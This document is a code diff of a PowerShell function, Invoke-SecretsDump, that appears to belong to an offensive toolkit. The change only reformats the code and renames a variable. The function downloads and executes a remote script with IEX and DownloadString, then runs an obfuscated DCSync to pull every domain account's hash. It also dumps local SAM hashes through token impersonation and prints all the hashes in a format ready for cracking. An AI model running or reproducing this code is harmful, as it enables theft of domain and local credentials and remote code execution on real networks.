@@ -1,31 +1,26 @@
 Function Invoke-SecretsDump {
-
     param (
-        [string]$Domain = $env:USERDNSDOMAIN,
-        [switch]$NoComputerHashes
-    )
+    [string]$Domain = $env:USERDNSDOMAIN,
+    [switch]$NoComputerHashes
+)
 
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')
 
-    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')
-    $Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $domain + ' /alL /cSv"'
-    $output = Invoke-Pandemonium -Command $Command
+$Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $Domain + ' /alL /cSv"'
+$output = Invoke-Pandemonium -Command $Command
 
-    Write-Host
-    Write-Host
+$lines = $output -split '\r?\n'
 
-
-    $lines = $output -split '\r?\n'
-
-    $HASHCATDATA = $lines | ForEach-Object {
-        $columns = $_ -split "`t"
-        $user = $columns[1]
-        $hash = $columns[2]
-        if ($user -and $hash) {
-            "$user::aad3b435b51404eeaad3b435b51404ee:$hash:::"
-        }
+$Data = $lines | ForEach-Object {
+    $columns = $_ -split "`t"
+    $user = $columns[1]
+    $hash = $columns[2]
+    if ($user -and $hash) {
+        "$user::aad3b435b51404eeaad3b435b51404ee:$hash:::"
     }
+}
 
-""
+Write-Output ""
 Write-Output "[*] Dumping local SAM hashes (uid:lmhash:nthash)"
 function DumpSAM{$ErrorActionPreference = "SilentlyContinue"
 try{&{[void][impsys.win32]}}catch{Add-Type -TypeDefinition "using System;using System.Runtime.InteropServices;namespace impsys{public class win32{[DllImport(`"kernel32.dll`",SetLastError=true)]public static extern bool CloseHandle(IntPtr hHandle);[DllImport(`"kernel32.dll`",SetLastError=true)]public static extern IntPtr OpenProcess(uint processAccess,bool bInheritHandle,int processId);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool OpenProcessToken(IntPtr ProcessHandle,uint DesiredAccess,out IntPtr TokenHandle);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool DuplicateTokenEx(IntPtr hExistingToken,uint dwDesiredAccess,IntPtr lpTokenAttributes,uint ImpersonationLevel,uint TokenType,out IntPtr phNewToken);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);[DllImport(`"advapi32.dll`",SetLastError=true)]public static extern bool RevertToSelf();}}"}
@@ -40,21 +35,26 @@ function bitshift($x, $c){return [math]::Floor($x * [math]::Pow(2, $c))}
 $users=IAS -Process {GNLPH};$excludedUsernames=@("Guest","DefaultAccount","WDAGUtilityAccount");foreach($user in $users){if($user.Username-notin$excludedUsernames){$output="$($user.Username):$($user.RID):aad3b435b51404eeaad3b435b51404ee:$($user.NTLM.ToLower()):::";$Output}}}
 DumpSAM
 
-""
+Write-Output ""
 Write-Output "[*] Dumping User Hashes (uid:rid:lmhash:nthash)"
 
-    $HASHCATDATA | ForEach-Object {
-       if ($_ -notlike "*$*"){Write-Output $_}
-       
-    }
-    ""
-if (!$NoComputerHashes){
-Write-Output "[*] Dumping Computer Hashes (uid:rid:lmhash:nthash)"
-        $HASHCATDATA | ForEach-Object {
-       if ($_ -like "*$*"){Write-Output $_}
-       
+
+
+$Data | ForEach-Object {
+    if ($_ -notlike "*$*") {
+        Write-Output $_
     }
 }
 
-    Write-Host ""
+Write-Output ""
+
+if (!$NoComputerHashes) {
+    Write-Output "[*] Dumping Computer Hashes (uid:rid:lmhash:nthash)"
+    $Data | ForEach-Object {
+        if ($_ -like "*$*") {
+            Write-Output $_
+            
+            }
+        }
+    }
 }
